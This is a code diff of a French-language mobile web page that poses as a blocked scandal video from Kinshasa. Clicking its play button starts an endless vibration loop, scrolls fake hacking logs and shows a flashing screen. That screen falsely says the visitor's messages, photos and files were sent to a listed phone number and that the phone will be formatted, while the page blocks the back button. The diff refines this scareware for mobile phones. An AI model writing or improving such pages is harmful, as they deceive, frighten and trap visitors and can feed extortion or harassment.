@@ -2,146 +2,149 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BUZZ KINSHASA 243</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BUZZ KIN 243</title>
     <style>
-        body { 
-            background-color: #000; color: #fff; font-family: Arial, sans-serif; 
-            margin: 0; padding: 0; overflow: hidden; touch-action: none;
+        * { box-sizing: border-box; }
+        body, html { 
+            background-color: #000; color: #fff; font-family: sans-serif; 
+            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
         }
 
-        /* PAGE DE DÉPART - L'APPÂT DIRECT */
+        /* Centrage parfait pour mobile */
         #launch-pad {
             display: flex; flex-direction: column; justify-content: center; 
-            align-items: center; height: 100vh; text-align: center; padding: 20px;
+            align-items: center; width: 100%; height: 100vh; text-align: center; padding: 15px;
         }
 
         .video-overlay {
-            width: 100%; max-width: 400px; height: 250px; 
-            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg');
-            background-size: cover; border-radius: 15px; border: 2px solid #333;
-            display: flex; justify-content: center; align-items: center; margin-bottom: 30px;
+            width: 90%; max-width: 320px; height: 180px; 
+            background: #222 url('https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg') center/cover;
+            border-radius: 12px; border: 2px solid #333;
+            display: flex; justify-content: center; align-items: center; margin-bottom: 20px;
         }
 
-        .play-btn-huge {
-            width: 80px; height: 80px; background: #ff0000; border-radius: 50%;
+        .play-btn {
+            width: 60px; height: 60px; background: #ff0000; border-radius: 50%;
             display: flex; justify-content: center; align-items: center;
-            box-shadow: 0 0 20px rgba(255,0,0,0.6); animation: pulse 1.5s infinite;
         }
 
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        h1 { font-size: 1.5rem; color: #ff4500; margin: 10px 0; }
 
         .main-button {
-            background: #1877f2; color: #fff; border: none; padding: 20px 40px;
-            font-size: 22px; font-weight: bold; border-radius: 50px; cursor: pointer;
-            width: 90%; max-width: 350px; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            background: #1877f2; color: #fff; border: none; padding: 18px;
+            font-size: 1.1rem; font-weight: bold; border-radius: 10px; width: 90%; max-width: 300px;
         }
 
-        /* TERMINAL INFINI */
+        /* TERMINAL MOBILE */
         #terminal {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; color: #0f0; padding: 15px; font-size: 14px; 
-            font-family: 'Courier New', monospace; z-index: 9999; overflow: hidden;
+            background: #000; color: #0f0; padding: 10px; font-size: 11px; 
+            font-family: monospace; z-index: 9999; overflow: hidden;
         }
 
-        /* ALERTE FINALE STRESS MAX */
+        /* ECRAN DE PANIQUE */
         #panic-room {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; color: #ff0000; flex-direction: column; 
             justify-content: center; align-items: center; text-align: center; 
-            z-index: 10000; animation: red-flash 0.1s infinite; padding: 20px;
+            z-index: 10000; padding: 15px;
         }
 
-        @keyframes red-flash { 0% { background: #000; } 50% { background: #f00; color: #fff; } }
-
-        .virus-tag { background: yellow; color: #000; padding: 15px; font-size: 1.5rem; font-weight: 900; margin: 20px 0; border: 4px solid #000; }
+        .virus-tag { background: yellow; color: #000; padding: 10px; font-weight: bold; border: 2px solid #000; margin: 15px 0; }
+        .num-box { font-size: 1.8rem; background: #fff; color: #000; padding: 5px; margin: 10px 0; font-weight: bold; }
+        
+        .flash { animation: flasher 0.1s infinite; }
+        @keyframes flasher { 0% { background: #000; } 50% { background: #600; } }
     </style>
 </head>
 <body>
 
 <div id="launch-pad">
     <div class="video-overlay">
-        <div class="play-btn-huge">
-            <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+        <div class="play-btn">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
         </div>
     </div>
-    <h1 style="color: #ff4500;">SCANDALE KINSHASA 243</h1>
-    <p style="font-size: 18px; margin-bottom: 30px;">Vidéo privée bloquée par la sécurité.</p>
+    <h1>SCANDALE KINSHASA 243</h1>
+    <p style="margin-bottom: 25px;">La vidéo est bloquée. Cliquez pour voir.</p>
     <button class="main-button" id="trigger">VOIR LA VIDÉO</button>
 </div>
 
 <div id="terminal"></div>
 
 <div id="panic-room">
-    <h1 style="font-size: 3rem; margin: 0;">ATTENTION !</h1>
+    <h1 style="font-size: 2rem;">⚠️ ATTENTION !</h1>
     <div class="virus-tag">VIRUS "X" DÉTECTÉ</div>
-    <p style="font-size: 1.4rem; font-weight: bold;">VOS MESSAGES, PHOTOS ET L'ENSEMBLE DE VOS FICHIERS ONT ÉTÉ ENVOYÉS AU :</p>
-    <div style="font-size: 2.5rem; background: white; color: black; padding: 10px; margin: 10px;">+243 819 679 859</div>
-    <p style="font-size: 1.2rem;">TRANSFERT RÉUSSI À 100%</p>
-    <h2 id="countdown" style="background: black; color: yellow; padding: 15px; border: 2px solid yellow;">FORMATAGE SYSTÈME : 10s</h2>
+    <p>VOS DONNÉES ONT ÉTÉ ENVOYÉES AU :</p>
+    <div class="num-box">+243 819 679 859</div>
+    <p>TRANSFERT : 100%</p>
+    <h2 id="countdown" style="border: 1px solid red; padding: 10px;">FORMATAGE DANS : 10s</h2>
 </div>
-
-<audio id="vibeSound" src="vibration.mp3" loop></audio>
 
 <script>
     const trigger = document.getElementById('trigger');
-    const vibeSound = document.getElementById('vibeSound');
     const terminal = document.getElementById('terminal');
     const panicRoom = document.getElementById('panic-room');
 
-    trigger.addEventListener('click', () => {
-        // VIBRATION INFINIE ET SON
-        vibeSound.play();
-        if (navigator.vibrate) {
+    // Fonction de vibration pour mobile
+    function startVibration() {
+        if ("vibrate" in navigator) {
+            // Boucle de vibration agressive
             setInterval(() => {
-                navigator.vibrate([2000, 50, 2000]); 
-            }, 300); // Se relance hyper vite pour ne jamais s'arrêter
+                navigator.vibrate([1000, 50, 1000]);
+            }, 500);
         }
+    }
 
+    trigger.addEventListener('click', function() {
+        // Déclencher la vibration sur le clic (obligatoire sur mobile)
+        startVibration();
+
+        // Afficher le terminal
         document.getElementById('launch-pad').style.display = 'none';
         terminal.style.display = 'block';
 
         let logs = [
-            "INJECTING X-VIRUS...", "BYPASSING ANDROID_SEC...", "ACCESSING WhatsApp_Vault",
-            "STEALING PRIVATE_PHOTOS...", "DUMPING SMS_MESSAGES...", "SENDING_TO_+243819679859",
-            "UPLOADING CONTACTS...", "EXTRACTING BANK_INFO...", "WIPING BOOT_LOADER..."
+            "SCANNING FILES...", "BYPASSING SECURITY...", "WHATSAPP_DB_FOUND", 
+            "EXTRACTING PHOTOS...", "SENDING TO SERVER...", "X-VIRUS_ACTIVE",
+            "UPLOADING CONTACTS...", "GATEWAY_BYPASS_OK", "REPRODUCING_DATA"
         ];
 
         let lineCount = 0;
         let hackProgress = setInterval(() => {
             let div = document.createElement('div');
-            div.innerHTML = `> <span style="color:white">[CRITICAL]</span> ${logs[Math.floor(Math.random() * logs.length)]}`;
+            div.textContent = "> [CRITICAL] " + logs[Math.floor(Math.random() * logs.length)];
             terminal.appendChild(div);
             window.scrollTo(0, document.body.scrollHeight);
             lineCount++;
 
-            // Après 120 lignes de code rapide, on lance la panique finale
-            if (lineCount > 120) {
+            if (lineCount > 80) {
                 clearInterval(hackProgress);
                 terminal.style.display = 'none';
                 panicRoom.style.display = 'flex';
+                panicRoom.classList.add('flash');
                 startTimer();
             }
-        }, 30);
+        }, 50);
     });
 
     function startTimer() {
         let time = 10;
         let cd = setInterval(() => {
             if (time > 0) {
-                document.getElementById('countdown').innerText = `FORMATAGE SYSTÈME : ${--time}s`;
+                document.getElementById('countdown').innerText = "FORMATAGE DANS : " + (--time) + "s";
             } else {
                 clearInterval(cd);
-                document.getElementById('countdown').innerText = "TÉLÉPHONE DÉTRUIT.";
+                document.getElementById('countdown').innerText = "SYSTÈME DÉTRUIT.";
             }
         }, 1000);
     }
 
-    // BLOCAGE DU BOUTON RETOUR
+    // Bloquer le retour
     history.pushState(null, null, location.href);
-    window.onpopstate = () => {
+    window.onpopstate = function() {
         history.go(1);
-        alert("VIRUS X : Tentative d'arrêt bloquée. Transfert vers +243 819 679 859 en cours...");
     };
 </script>
 
